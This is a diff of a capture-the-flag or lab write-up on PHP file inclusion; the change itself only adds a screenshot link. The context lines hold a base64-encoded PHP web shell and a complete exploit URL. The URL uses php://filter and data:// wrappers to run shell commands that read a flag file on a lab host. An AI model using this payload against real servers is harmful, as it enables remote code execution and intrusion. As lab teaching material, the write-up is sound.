@@ -105,6 +105,8 @@ In the table above, PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAh
 
 Note: It is important to not include the &cmd=whoami in the input field since it will be encoded when the form is submitted. Once encoded, the backend will treat it as part of the base64 code, giving you an invalid byte sequence error.
 
+![](capturas/php-wrappers.png)
+
 ```
 http://10.10.205.31/playground.php?page=php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd=cd%20flags;ls;cat%20cd3c67e5079de2700af6cea0a405f9cc.txt
 ```
